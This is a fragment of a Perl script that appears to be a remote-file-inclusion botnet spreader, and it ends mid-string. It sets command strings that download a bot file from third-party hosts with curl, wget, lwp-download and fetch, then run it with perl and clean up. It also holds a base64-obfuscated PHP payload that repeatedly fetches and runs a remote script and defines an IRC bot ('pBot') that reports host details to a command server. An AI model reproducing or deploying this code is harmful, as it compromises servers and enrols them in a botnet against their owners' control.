my $myurl     = "http://www.freewebtown.com/origins/";
my $Ckrid     = $myurl."Ckrid1.txt?";
my $Ckrid2    = $myurl."Ckrid2.txt?";
my $spread    = $myurl."x.txt?";
my $spread2   = $myurl."x.txt?";
my $joomlaz   = $myurl."joomla.txt";
my $e107cmdsp = "cd /tmp; rm -rf b2*; curl -O http://www.grupoakro.com/tienda/images/rficrackbot.txt; wget http://www.grupoakro.com/tienda/images/rficrackbot.txt; lwp-download http://www.grupoakro.com/tienda/images/rficrackbot.txt; fetch http://www.grupoakro.com/tienda/images/rficrackbot.txt; perl rficrackbot.txt; rm -rf bot.*";
my $e107cmdsp2 = "cd /var/tmp; rm -rf b1*; curl -O http://www.grupoakro.com/tienda/images/rficrackbot.txt; wget http://www.grupoakro.com/tienda/images/rficrackbot.txt; fetch http://www.grupoakro.com/tienda/images/rficrackbot.txt; perl rficrackbot.txt";
my $e107cmdsp3 = "cd /var/tmp; rm -rf new*; wget http://www.grupoakro.com/tienda/images/rficrackbot.txt; curl -O http://www.grupoakro.com/tienda/images/rficrackbot.txt; lwp-download http://www.grupoakro.com/tienda/images/rficrackbot.txt; fetch http://www.grupoakro.com/tienda/images/rficrackbot.txt; perl rficrackbot.txt";
my $bypass    = "http://www.aminef.or.id/images/google.php?";
my $prl      = "[php]echo(base64_decode(\"Voo\").php_uname().base64_decode(\"Doo\"));eval(base64_decode(\"c2V0X3RpbWVfbGltaXQoMCk7IA0KZXJyb3JfcmVwb3J0aW5nKDApOyANCg0KJHVybFsyXSA9ICJodHRwOi8vd3d3LmNvb2xlcmdhcy5jb20vLm1vZHMvc2NuLnR4dCI7DQokc2ZlWzJdID0gInNlc3Nfc2RmNTQ1NHQ0dHk4NWdzZDU4IjsNCg0KZXhlYygid2dldCAiLiR1cmxbMl0uIiAtTyAiLiRzZmVbMl0uIjsgY2htb2QgNzU1ICIuJHNmZVsyXS4iOyBwZXJsICIuJHNmZVsyXS4iKiIpOw0KZXhlYygiZmV0Y2ggLU8gIi4kc2ZlWzJdLiIgIi4kdXJsWzJdLiI7IGNobW9kIDc1NSAiLiRzZmVbMl0uIjsgcGVybCAiLiRzZmVbMl0uIioiKTsNCmV4ZWMoImNVcmwgLU8gIi4kc2ZlWzJdLiIgIi4kdXJsWzJdLiI7IGNobW9kIDc1NSAiLiRzZmVbMl0uIjsgcGVybCAiLiRzZmVbMl0uIioiKTsNCmV4ZWMoImx5bnggLWR1bXAgIi4kdXJsWzJdLiIgIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAiLiRzZmVbMl0uIjsgcGVybCAiLiRzZmVbMl0uIioiKTsNCmV4ZWMoIkdFVCAiLiR1cmxbMl0uIj4iLiRzZmVbMl0uIjsgY2htb2QgNzU1ICIuJHNmZVsyXS4iOyBwZXJsICIuJHNmZVsyXS4iKiIpOw0KZXhlYygibHdwLWRvd25sb2FkICIuJHVybFsyXS4iICIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgIi4kc2ZlWzJdLiI7IHBlcmwgIi4kc2ZlWzJdLiIqIik7DQpzaGVsbF9leGVjKCJ3Z2V0ICIuJHVybFsyXS4iIC1PICIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgIi4kc2ZlWzJdLiI7IHBlcmwgIi4kc2ZlWzJdLiIqIik7DQpzaGVsbF9leGVjKCJmZXRjaCAtTyAiLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1ICIuJHNmZVsyXS4iOyBwZXJsICIuJHNmZVsyXS4iKiIpOw0Kc2hlbGxfZXhlYygiY1VybCAtTyAiLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1ICIuJHNmZVsyXS4iOyBwZXJsICIuJHNmZVsyXS4iKiIpOw0Kc2hlbGxfZXhlYygibHlueCAtZHVtcCAiLiR1cmxbMl0uIiAiLiRzZmVbMl0uIjsgY2htb2QgNzU1ICIuJHNmZVsyXS4iOyBwZXJsICIuJHNmZVsyXS4iKiIpOw0Kc2hlbGxfZXhlYygiR0VUICIuJHVybFsyXS4iPiIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgIi4kc2ZlWzJdLiI7IHBlcmwgIi4kc2ZlWzJdLiIqIik7DQpzaGVsbF9leGVjKCJsd3AtZG93bmxvYWQgIi4kdXJsWzJdLiIgIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAiLiRzZmVbMl0uIjsgcGVybCAiLiRzZmVbMl0uIioiKTsNCnN5c3RlbSgid2dldCAiLiR1cmxbMl0uIiAtTyAiLiRzZmVbMl0uIjsgY2htb2QgNzU1ICIuJHNmZVsyXS4iOyBwZXJsICIuJHNmZVsyXS4iKiIpOw0Kc3lzdGVtKCJmZXRjaCAtTyAiLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1ICIuJHNmZVsyXS4iOyBwZXJsICIuJHNmZVsyXS4iKiIpOw0Kc3lzdGVtKCJjVXJsIC1PICIuJHNmZVsyXS4iICIuJHVybFsyXS4iOyBjaG1vZCA3NTUgIi4kc2ZlWzJdLiI7IHBlcmwgIi4kc2ZlWzJdLiIqIik7DQpzeXN0ZW0oImx5bnggLWR1bXAgIi4kdXJsWzJdLiIgIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAiLiRzZmVbMl0uIjsgcGVybCAiLiRzZmVbMl0uIioiKTsNCnN5c3RlbSgiR0VUICIuJHVybFsyXS4iPiIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgIi4kc2ZlWzJdLiI7IHBlcmwgIi4kc2ZlWzJdLiIqIik7DQpzeXN0ZW0oImx3cC1kb3dubG9hZCAiLiR1cmxbMl0uIiAiLiRzZmVbMl0uIjsgY2htb2QgNzU1ICIuJHNmZVsyXS4iOyBwZXJsICIuJHNmZVsyXS4iKiIpOw0KcGFzc3RocnUoIndnZXQgIi4kdXJsWzJdLiIgLU8gIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAiLiRzZmVbMl0uIjsgcGVybCAiLiRzZmVbMl0uIioiKTsNCnBhc3N0aHJ1KCJmZXRjaCAtTyAiLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1ICIuJHNmZVsyXS4iOyBwZXJsICIuJHNmZVsyXS4iKiIpOw0KcGFzc3RocnUoImNVcmwgLU8gIi4kc2ZlWzJdLiIgIi4kdXJsWzJdLiI7IGNobW9kIDc1NSAiLiRzZmVbMl0uIjsgcGVybCAiLiRzZmVbMl0uIioiKTsNCnBhc3N0aHJ1KCJseW54IC1kdW1wICIuJHVybFsyXS4iICIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgIi4kc2ZlWzJdLiI7IHBlcmwgIi4kc2ZlWzJdLiIqIik7DQpwYXNzdGhydSgiR0VUICIuJHVybFsyXS4iPiIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgIi4kc2ZlWzJdLiI7IHBlcmwgIi4kc2ZlWzJdLiIqIik7DQpwYXNzdGhydSgibHdwLWRvd25sb2FkICIuJHVybFsyXS4iICIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgIi4kc2ZlWzJdLiI7IHBlcmwgIi4kc2ZlWzJdLiIqIik7DQovLy0tIC90bXANCmV4ZWMoIndnZXQgIi4kdXJsWzJdLiIgLU8gL3RtcC8iLiRzZmVbMl0uIjsgY2htb2QgNzU1IC90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3RtcC8iLiRzZmVbMl0uIioiKTsNCmV4ZWMoImZldGNoIC1PIC90bXAvIi4kc2ZlWzJdLiIgIi4kdXJsWzJdLiI7IGNobW9kIDc1NSAvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC90bXAvIi4kc2ZlWzJdLiIqIik7DQpleGVjKCJjVXJsIC1PIC90bXAvIi4kc2ZlWzJdLiIgIi4kdXJsWzJdLiI7IGNobW9kIDc1NSAvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC90bXAvIi4kc2ZlWzJdLiIqIik7DQpleGVjKCJseW54IC1kdW1wICIuJHVybFsyXS4iIC90bXAvIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC90bXAvIi4kc2ZlWzJdLiIqIik7DQpleGVjKCJHRVQgIi4kdXJsWzJdLiI+L3RtcC8iLiRzZmVbMl0uIjsgY2htb2QgNzU1IC90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3RtcC8iLiRzZmVbMl0uIioiKTsNCmV4ZWMoImx3cC1kb3dubG9hZCAiLiR1cmxbMl0uIiAvdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdG1wLyIuJHNmZVsyXS4iKiIpOw0Kc2hlbGxfZXhlYygid2dldCAiLiR1cmxbMl0uIiAtTyAvdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdG1wLyIuJHNmZVsyXS4iKiIpOw0Kc2hlbGxfZXhlYygiZmV0Y2ggLU8gL3RtcC8iLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1IC90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3RtcC8iLiRzZmVbMl0uIioiKTsNCnNoZWxsX2V4ZWMoImNVcmwgLU8gL3RtcC8iLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1IC90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3RtcC8iLiRzZmVbMl0uIioiKTsNCnNoZWxsX2V4ZWMoImx5bnggLWR1bXAgIi4kdXJsWzJdLiIgL3RtcC8iLiRzZmVbMl0uIjsgY2htb2QgNzU1IC90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3RtcC8iLiRzZmVbMl0uIioiKTsNCnNoZWxsX2V4ZWMoIkdFVCAiLiR1cmxbMl0uIj4vdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdG1wLyIuJHNmZVsyXS4iKiIpOw0Kc2hlbGxfZXhlYygibHdwLWRvd25sb2FkICIuJHVybFsyXS4iIC90bXAvIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC90bXAvIi4kc2ZlWzJdLiIqIik7DQpzeXN0ZW0oIndnZXQgIi4kdXJsWzJdLiIgLU8gL3RtcC8iLiRzZmVbMl0uIjsgY2htb2QgNzU1IC90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3RtcC8iLiRzZmVbMl0uIioiKTsNCnN5c3RlbSgiZmV0Y2ggLU8gL3RtcC8iLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1IC90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3RtcC8iLiRzZmVbMl0uIioiKTsNCnN5c3RlbSgiY1VybCAtTyAvdG1wLyIuJHNmZVsyXS4iICIuJHVybFsyXS4iOyBjaG1vZCA3NTUgL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdG1wLyIuJHNmZVsyXS4iKiIpOw0Kc3lzdGVtKCJseW54IC1kdW1wICIuJHVybFsyXS4iIC90bXAvIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC90bXAvIi4kc2ZlWzJdLiIqIik7DQpzeXN0ZW0oIkdFVCAiLiR1cmxbMl0uIj4vdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdG1wLyIuJHNmZVsyXS4iKiIpOw0Kc3lzdGVtKCJsd3AtZG93bmxvYWQgIi4kdXJsWzJdLiIgL3RtcC8iLiRzZmVbMl0uIjsgY2htb2QgNzU1IC90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3RtcC8iLiRzZmVbMl0uIioiKTsNCnBhc3N0aHJ1KCJ3Z2V0ICIuJHVybFsyXS4iIC1PIC90bXAvIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC90bXAvIi4kc2ZlWzJdLiIqIik7DQpwYXNzdGhydSgiZmV0Y2ggLU8gL3RtcC8iLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1IC90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3RtcC8iLiRzZmVbMl0uIioiKTsNCnBhc3N0aHJ1KCJjVXJsIC1PIC90bXAvIi4kc2ZlWzJdLiIgIi4kdXJsWzJdLiI7IGNobW9kIDc1NSAvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC90bXAvIi4kc2ZlWzJdLiIqIik7DQpwYXNzdGhydSgibHlueCAtZHVtcCAiLiR1cmxbMl0uIiAvdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdG1wLyIuJHNmZVsyXS4iKiIpOw0KcGFzc3RocnUoIkdFVCAiLiR1cmxbMl0uIj4vdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdG1wLyIuJHNmZVsyXS4iKiIpOw0KcGFzc3RocnUoImx3cC1kb3dubG9hZCAiLiR1cmxbMl0uIiAvdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdG1wLyIuJHNmZVsyXS4iKiIpOw0KLy8tLSAvdmFyL3RtcA0KZXhlYygid2dldCAiLiR1cmxbMl0uIiAtTyAvdmFyL3RtcC8iLiRzZmVbMl0uIjsgY2htb2QgNzU1IC92YXIvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC92YXIvdG1wLyIuJHNmZVsyXS4iKiIpOw0KZXhlYygiZmV0Y2ggLU8gL3Zhci90bXAvIi4kc2ZlWzJdLiIgIi4kdXJsWzJdLiI7IGNobW9kIDc1NSAvdmFyL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdmFyL3RtcC8iLiRzZmVbMl0uIioiKTsNCmV4ZWMoImNVcmwgLU8gL3Zhci90bXAvIi4kc2ZlWzJdLiIgIi4kdXJsWzJdLiI7IGNobW9kIDc1NSAvdmFyL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdmFyL3RtcC8iLiRzZmVbMl0uIioiKTsNCmV4ZWMoImx5bnggLWR1bXAgIi4kdXJsWzJdLiIgL3Zhci90bXAvIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAvdmFyL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdmFyL3RtcC8iLiRzZmVbMl0uIioiKTsNCmV4ZWMoIkdFVCAiLiR1cmxbMl0uIj4vdmFyL3RtcC8iLiRzZmVbMl0uIjsgY2htb2QgNzU1IC92YXIvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC92YXIvdG1wLyIuJHNmZVsyXS4iKiIpOw0KZXhlYygibHdwLWRvd25sb2FkICIuJHVybFsyXS4iIC92YXIvdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3Zhci90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3Zhci90bXAvIi4kc2ZlWzJdLiIqIik7DQpzaGVsbF9leGVjKCJ3Z2V0ICIuJHVybFsyXS4iIC1PIC92YXIvdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3Zhci90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3Zhci90bXAvIi4kc2ZlWzJdLiIqIik7DQpzaGVsbF9leGVjKCJmZXRjaCAtTyAvdmFyL3RtcC8iLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1IC92YXIvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC92YXIvdG1wLyIuJHNmZVsyXS4iKiIpOw0Kc2hlbGxfZXhlYygiY1VybCAtTyAvdmFyL3RtcC8iLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1IC92YXIvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC92YXIvdG1wLyIuJHNmZVsyXS4iKiIpOw0Kc2hlbGxfZXhlYygibHlueCAtZHVtcCAiLiR1cmxbMl0uIiAvdmFyL3RtcC8iLiRzZmVbMl0uIjsgY2htb2QgNzU1IC92YXIvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC92YXIvdG1wLyIuJHNmZVsyXS4iKiIpOw0Kc2hlbGxfZXhlYygiR0VUICIuJHVybFsyXS4iPi92YXIvdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3Zhci90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3Zhci90bXAvIi4kc2ZlWzJdLiIqIik7DQpzaGVsbF9leGVjKCJsd3AtZG93bmxvYWQgIi4kdXJsWzJdLiIgL3Zhci90bXAvIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAvdmFyL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdmFyL3RtcC8iLiRzZmVbMl0uIioiKTsNCnN5c3RlbSgid2dldCAiLiR1cmxbMl0uIiAtTyAvdmFyL3RtcC8iLiRzZmVbMl0uIjsgY2htb2QgNzU1IC92YXIvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC92YXIvdG1wLyIuJHNmZVsyXS4iKiIpOw0Kc3lzdGVtKCJmZXRjaCAtTyAvdmFyL3RtcC8iLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1IC92YXIvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC92YXIvdG1wLyIuJHNmZVsyXS4iKiIpOw0Kc3lzdGVtKCJjVXJsIC1PIC92YXIvdG1wLyIuJHNmZVsyXS4iICIuJHVybFsyXS4iOyBjaG1vZCA3NTUgL3Zhci90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3Zhci90bXAvIi4kc2ZlWzJdLiIqIik7DQpzeXN0ZW0oImx5bnggLWR1bXAgIi4kdXJsWzJdLiIgL3Zhci90bXAvIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAvdmFyL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdmFyL3RtcC8iLiRzZmVbMl0uIioiKTsNCnN5c3RlbSgiR0VUICIuJHVybFsyXS4iPi92YXIvdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3Zhci90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3Zhci90bXAvIi4kc2ZlWzJdLiIqIik7DQpzeXN0ZW0oImx3cC1kb3dubG9hZCAiLiR1cmxbMl0uIiAvdmFyL3RtcC8iLiRzZmVbMl0uIjsgY2htb2QgNzU1IC92YXIvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC92YXIvdG1wLyIuJHNmZVsyXS4iKiIpOw0KcGFzc3RocnUoIndnZXQgIi4kdXJsWzJdLiIgLU8gL3Zhci90bXAvIi4kc2ZlWzJdLiI7IGNobW9kIDc1NSAvdmFyL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdmFyL3RtcC8iLiRzZmVbMl0uIioiKTsNCnBhc3N0aHJ1KCJmZXRjaCAtTyAvdmFyL3RtcC8iLiRzZmVbMl0uIiAiLiR1cmxbMl0uIjsgY2htb2QgNzU1IC92YXIvdG1wLyIuJHNmZVsyXS4iOyBwZXJsIC92YXIvdG1wLyIuJHNmZVsyXS4iKiIpOw0KcGFzc3RocnUoImNVcmwgLU8gL3Zhci90bXAvIi4kc2ZlWzJdLiIgIi4kdXJsWzJdLiI7IGNobW9kIDc1NSAvdmFyL3RtcC8iLiRzZmVbMl0uIjsgcGVybCAvdmFyL3RtcC8iLiRzZmVbMl0uIioiKTsNCnBhc3N0aHJ1KCJseW54IC1kdW1wICIuJHVybFsyXS4iIC92YXIvdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3Zhci90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3Zhci90bXAvIi4kc2ZlWzJdLiIqIik7DQpwYXNzdGhydSgiR0VUICIuJHVybFsyXS4iPi92YXIvdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3Zhci90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3Zhci90bXAvIi4kc2ZlWzJdLiIqIik7DQpwYXNzdGhydSgibHdwLWRvd25sb2FkICIuJHVybFsyXS4iIC92YXIvdG1wLyIuJHNmZVsyXS4iOyBjaG1vZCA3NTUgL3Zhci90bXAvIi4kc2ZlWzJdLiI7IHBlcmwgL3Zhci90bXAvIi4kc2ZlWzJdLiIqIik7DQoNCmNsYXNzIHBCb3Qgew0KDQogdmFyICRjb25maWcgPSBhcnJheSgic2VydmVyIj0+ImYyMDExLmtuYXF1LmV1IiwNCiAgICAgICAgICAgICAgICAgICAgICJwb3J0Ij0+IjQyNDQiLA0KICAgICAgICAgICAgICAgICAgICAgInBhc3MiPT4iIiwNCiAgICAgICAgICAgICAgICAgICAgICJtYXhyYW5kIj0+IjQiLA0KICAgICAgICAgICAgICAgICAgICAgImNoYW4iPT4iIyNsaW51eCMjIiwNCiAgICAgICAgICAgICAgICAgICAgICJjaGFuMiI9PiIjI2xpbnV4IyMiLA0KICAgICAgICAgICAgICAgICAgICAgImtleSI9PiJzY2FuIiwNCiAgICAgICAgICAgICAgICAgICAgICJtb2RlcyI9PiIrcCIsDQogICAgICAgICAgICAgICAgICAgICAicGFzc3dvcmQiPT4ieWVzIiwNCiAgICAgICAgICAgICAgICAgICAgICJ0cmlnZ2VyIj0+Ii4iLA0KICAgICAgICAgICAgICAgICAgICAgImhvc3RhdXRoIj0+IioiDQogICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICAgICAgIHZhciAkdXNlcnMgPSBhcnJheSgpOyANCiBmdW5jdGlvbiBzdGFydCgpIA0KIHsgDQogICAgaWYoISgkdGhpcy0+Y29ubiA9IGZzb2Nrb3BlbigkdGhpcy0+Y29uZmlnWydzZXJ2ZXInXSwkdGhpcy0+Y29uZmlnWydwb3J0J10sJGUsJHMsMzApKSkgDQogICAgICAgJHRoaXMtPnN0YXJ0KCk7IA0KICAgICMkaWRlbnQgPSAkdGhpcy0+Y29uZmlnWydwcmVmaXgnXTsNCg0KCSMkaWRlbnQgPSAkbmlja3lbcmFuZCgwLGNvdW50KCRuaWNreSkgLSAxKV07DQoNCiAgICAkYWxwaCA9IHJhbmdlKCIwIiwiOSIpOw0KICAgIGZvcigkaT0wOyRpPCR0aGlzLT5jb25maWdbJ21heHJhbmQnXTskaSsrKSANCiAgICAgICAjJGlkZW50IC49ICRhbHBoW3JhbmQoMCw5KV07DQogICAgaWYoc3RybGVuKCR0aGlzLT5jb25maWdbJ3Bhc3MnXSk+MCkgDQogICAgICAgJHRoaXMtPnNlbmQoIlBBU1MgIi4kdGhpcy0+Y29uZmlnWydwYXNzJ10pOw0KICAgICMkdGhpcy0+c2VuZCgiVVNFUiAiLiRpZGVudC4iIDEyNy4wLjAuMSBsb2NhbGhvc3QgOiIucGhwX3VuYW1lKCkuIiIpOw0KCSR0aGlzLT5zZXRfaWRlbnQoKTsNCiAgICAkdGhpcy0+c2V0X25pY2soKTsNCiAgICAkdGhpcy0+bWFpbigpOw0KIH0gDQogDQogZnVuY3Rpb24gbWFpbigpIA0KIHsgDQogICAgd2hpbGUoIWZlb2YoJHRoaXMtPmNvbm4pKSANCiAgICB7IA0KICAgICAgICR0aGlzLT5idWYgPSB0cmltKGZnZXRzKCR0aGlzLT5jb25uLDUxMikpOyANCiAgICAgICAkY21kID0gZXhwbG9kZSgiICIsJHRoaXMtPmJ1Zik7IA0KICAgICAgIGlmKHN1YnN0cigkdGhpcy0+YnVmLDAsNik9PSJQSU5HIDoiKSANCiAgICAgICB7IA0KICAgICAgICAgICR0aGlzLT5zZW5kKCJQT05HIDoiLnN1YnN0cigkdGhpcy0+YnVmLDYpKTsgDQogICAgICAgfSANCiAgICAgICBpZihpc3NldCgkY21kWzFdKSAmJiAkY21kWzFdID09IjAwMSIpIA0KICAgICAgIHsgDQogICAgICAgICAgJHRoaXMtPnNlbmQoIk1PREUgIi4kdGhpcy0+bmljay4iICIuJHRoaXMtPmNvbmZpZ1snbW9kZXMnXSk7IA0KICAgICAgICAgICR0aGlzLT5zZW5kKCJKT0lOICIuJHRoaXMtPmNvbmZpZ1snY2hhbiddLiIgIi4kdGhpcy0+Y29uZmlnWydrZXknXS4iIik7DQogICAgICAgICAgJHRoaXMtPmpvaW4oJHRoaXMtPmNvbmZpZ1snY2hhbiddLCR0aGlzLT5jb25maWdbJ2tleSddKTsNCiAgICAgICB9IA0KCSAgIGlmKGlzc2V0KCRjbWRbMV0pICYmICRjbWRbMV0gPT0iMDAyIikgDQogICAgICAgeyANCiAgICAgICAgICBpZiAoQGluaV9nZXQoInNhZmVfbW9kZSIpIG9yIHN0cnRvbG93ZXIoQGluaV9nZXQoInNhZmVfbW9kZSIpKSA9PSAib24iKSB7ICRzYWZlbW9kZSA9ICIDNE9OAyI7IH0NCiAgICAgICAgICBlbHNlIHsgJHNhZmVtb2RlID0gIgM5T0ZGAyI7IH0NCgkJICANCgkJICAkdXNyID0gZ2V0X2N1cnJlbnRfdXNlcigpOw0KCQkJaWYgKCR1c3IgPT0gIiIpIHsgDQoJCQkJJHByb2Nlc3NVc2VyID0gcG9zaXhfZ2V0cHd1aWQocG9zaXhfZ2V0ZXVpZCgpKTsNCgkJCQkkdXNyID0gJHByb2Nlc3NVc2VyWyduYW1lJ107IA0KCQkJfQ0KDQoJCSAgJHVzcm5uID0gIgMxNCIuJHVzci4iAyI7DQoJCSAgDQoJCSAgaWYoJHVzciA9PSAicm9vdCIpIHsgJHVzcm4gPSAiAzEyAiIuJHVzci4iAgMiOyB9DQoJCSAgaWYoJHVzciA9PSAiU1lTVEVNIikgeyAkdXNybiA9ICIDMTICIi4kdXNyLiICAyI7IH0JCSANCgkJDQoJCSAgJG1uYW1lID0gIgMxNCIucGhwX3VuYW1lKCkuIgMiOw0KCQkgICR1cmwgPSAiAzE0aHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uIiIuJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10uIgMiOw0KCQkgICRwdGggPSAiAzE0Ii5nZXRjd2QoKS4iAyI7DQoJCSAgDQoJCQkkcHRoaCA9ICBnZXRjd2QoKS4iIjsNCiAgICAgICAgICAgIGNobW9kKCRwdGhoLCAwNzU1KTsNCgkJCSRwZXJtcyA9IGZpbGVwZXJtcygiJHB0aGgiKTsNCg0KCQlpZiAoKCRwZXJtcyAmIDB4QzAwMCkgPT0gMHhDMDAwKSB7ICRpbmZvID0gJ3MnOw0KCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4QTAwMCkgPT0gMHhBMDAwKSB7ICRpbmZvID0gJ2wnOw0KCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4ODAwMCkgPT0gMHg4MDAwKSB7ICRpbmZvID0gJy0nOw0KCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4NjAwMCkgPT0gMHg2MDAwKSB7ICRpbmZvID0gJ2InOw0KCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4NDAwMCkgPT0gMHg0MDAwKSB7ICRpbmZvID0gJ2QnOw0KCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4MjAwMCkgPT0gMHgyMDAwKSB7ICRpbmZvID0gJ2MnOw0KCQl9IGVsc2VpZiAoKCRwZXJtcyAmIDB4MTAwMCkgPT0gMHgxMDAwKSB7ICRpbmZvID0gJ3AnOw0KCQl9IGVsc2UgeyAkaW5mbyA9ICd1JzsgfQ0KDQoJCS8vIE93bmVyDQoJCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMTAwKSA/ICdyJyA6ICctJyk7DQoJCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDgwKSA/ICd3JyA6ICctJyk7DQoJCSRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDQwKSA/DQoJCQkJCSgoJHBlcm1zICYgMHgwODAwKSA/ICdzJyA6ICd4JyApIDoNCgkJCQkJKCgkcGVybXMgJiAweDA4MDApID8gJ1MnIDogJy0nKSk7DQoNCgkJLy8gR3JvdXANCgkJJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMjApID8gJ3InIDogJy0nKTsNCgkJJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMTApID8gJ3cnIDogJy0nKTsNCgkJJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDgpID8NCgkJCQkJKCgkcGVybXMgJiAweDA0MDApID8gJ3MnIDogJ3gnICkgOg0KCQkJCQkoKCRwZXJtcyAmIDB4MDQwMCkgPyAnUycgOiAnLScpKTsNCg0KCQkvLyBXb3JsZA0KCQkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwNCkgPyAncicgOiAnLScpOw0KCQkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwMikgPyAndycgOiAnLScpOw0KCQkkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwMSkgPw0KCQkJCQkoKCRwZXJtcyAmIDB4MDIwMCkgPyAndCcgOiAneCcgKSA6DQoJCQkJCSgoJHBlcm1zICYgMHgwMjAwKSA/ICdUJyA6ICctJykpOw0KCQkJCQkNCgkJCSRyZ2h0cyA9ICIDMTQiLiRpbmZvLiIDIjsJDQoNCgkgICAgICAkdGhpcy0+c2VuZCgiSk9JTiAiLiR0aGlzLT5jb25maWdbJ2NoYW4nXS4iICIuJHRoaXMtPmNvbmZpZ1sn